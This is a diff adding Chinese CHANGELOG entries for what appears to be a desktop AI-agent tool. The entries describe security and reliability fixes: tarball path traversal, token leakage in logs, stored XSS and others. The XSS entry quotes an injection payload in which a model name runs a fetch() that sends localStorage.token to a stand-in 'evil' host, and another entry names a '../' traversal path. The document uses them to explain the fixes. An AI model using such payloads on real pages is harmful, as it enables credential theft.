@@ -6,6 +6,20 @@ README 元数据带回，供老版本在「发现新版本」时展示新版更�
 
 ## 未发布
 
+- **桌面引擎热更新先验摘要、再按成员白名单解包（P0 安全）**：旧实现把 npm tarball 直接交给 `tarfile.extract()`，成员名只要以 `package/` 开头就放行，`package/../../..` 能穿出 staging 写到用户目录；下载后只校验体积，没有比对 registry 的 `dist.integrity`；版本核对还在解包之后，即便报错也撤不回已写入的文件。修法：`fetchIntegrity()` 读 packument 的 `dist.integrity`（缺失或非 sha512 一律拒绝更新，与 tarball 同一 host 白名单）+ `fileIntegrity()` 下载后 sha512 比对 + 逐成员校验解包（拒 `..`/反斜杠/链接/特殊文件/包外成员/超 512MB）。harness 增 8 例，含越界写与符号链接两个攻击样本。
+
+- **跨卷热更新不再留残缺引擎（P1 可靠性）**：`EXDEV` 分支原实现直接 `cpSync` 到正式目录，进程被杀/断电会留下「main.py 在、app/core 不全」的目录，而启动自愈的判据是「script 缺失」——判据不成立，引擎永久起不来只能重装。改为先复制到同卷 `app.incoming-*` 再原子改名（要么全新要么全旧），失败清半成品并由外层回滚；启动时顺带清理崩溃残留。
+
+- **启动输出不再打印访问令牌（P1 安全）**：桌面端把 sidecar 的 stdout 原样写进 `desktop-logs/backend.log`，带 token 的配对地址等于把服务凭据写成可外传的文件——拿到日志就能接管服务、读全部任务产物并 `POST` 建任务。默认打码，完整链接仍可在 UI「手机连接」面板取；纯命令行用户加 `--print-token` 恢复原输出。
+
+- **内联事件处理器参数改用 `jsq()`（P1 安全，堵存储型 XSS）**：`esc()` 是 HTML 转义，`&#39;` 在属性值里会被解码回 `'`，JS 字符串照样闭合。上游 `/v1/models` 返回模型名 `x');fetch('http://evil/'+localStorage.token)//`，经「获取模型列表」落进配置后即可在页面执行。181 处内联处理器参数（模型名、运行产物文件名、git stash ref、平台账号名等）统一换成 `jsq()`，文本节点/`title`/`data-*` 的 `esc()` 不动。
+
+- **手动模式评审不再同族互评（P1 正确性）**：手动模式走 v1 选择器，只排除作者 id，不看模型族/供应商/上游；作者与下一候选绑定同族模型时，「跨厂商对抗评审」退化成同族同盲区互评且报告无提示。改为与自动/专家模式一致走 `router.pick_reviewer`（隔离候选耗尽时如实回退并写进 `route.reviewer`），并删除失去调用方的 `_pick_reviewer_legacy`。
+
+- **CLI 输出字段类型漂移不再整轮崩溃（P1 可靠性）**：`usage` / `item` / `modelUsage` 只承载统计，旧实现 `ev.get("usage") or {}` 挡不住字符串/数字，`u.get(...)` 抛 `AttributeError` 直接穿出 `run_agent`，错误分类与换将白名单全部失效，用户只看到 traceback。新增 `_obj` / `_int_or_zero` / `_float_or_zero` 收敛点；此前 `cli_parsers` 全仓零测试引用，本次补 8 项基线。
+
+- **ACP 终端命令随会话收尾一起取消（P1 可靠性）**：`terminal/create` 起的命令线程只在 agent 主动 release/kill 时收手，`run_agent` 的 finally 只关连接。agent 先结束会话后，长命令继续在同一工作目录写文件、踩掉下一个任务的改动。改为统一置 cancel + 共享 2s 预算 join，卡死命令返回 id 不无限等。
+
 - **对话「返回」后输入框消失治了（主页 composer 困在隐藏 page-home 实案）**：workbench 主页把 `#sub-tasks .cmp-box` 搬进 `#rd-input-slot`（homeMountComposer），而从侧栏点任务行进对话走 `showDetailInMain`——它刻意不走 switchTab（会先 closeRun 抹掉 detailTaskKey），却因此漏掉「离开主页搬回 composer」的契约；对话点「返回」（closeRun 的回任务页分支）也不搬回，`.cmp-box` 困在隐藏的 page-home 里，表单只剩问候语和类型 chips。修法：`showDetailInMain` 进详情时自行 `homeUnmountComposer()`（与 switchTab/exitSettings 同契约，侧栏行/检查器/建任务后跳转等主视图入口全收敛在这一个函数）；新增 tests/test_ui_home_composer_back.py 切片回归（假 DOM 真跑搬运对+进详情路径，变异验证过红）。
 
 - **记忆中心/运行详情/文件检查点全线「服务内部错误」治了（store 路由遮蔽复发案）**：90e24d1 在 `_route_get`/`_route_post` 中段的评测台路由里写了 `from core import evalbench, store`——函数内 import 把 `store` 变成整个路由函数的局部名，凡在该行**之前**引用 `store` 的路由（记忆中心、项目记忆、运行详情、文件检查点、手机状态等）一进就 `UnboundLocalError`，统一被 500 兜底接住；`/api/state`、经验库、知识库不碰 `store` 幸存，形成「半站瘫痪」假象。2026-10-20 15:59 同步脚本把带毒代码镜像进 npm 副本并重启后爆发。修法：两处毒 import 拔除（模块顶层本就导入 store）+ 新增 AST 静态闸 tests/test_route_store_shadow_guard.py（路由函数体内任何绑定 store 的函数级 import 直接测试失败），杜绝 065c030b（0.1.70）以来第三次同类事故。
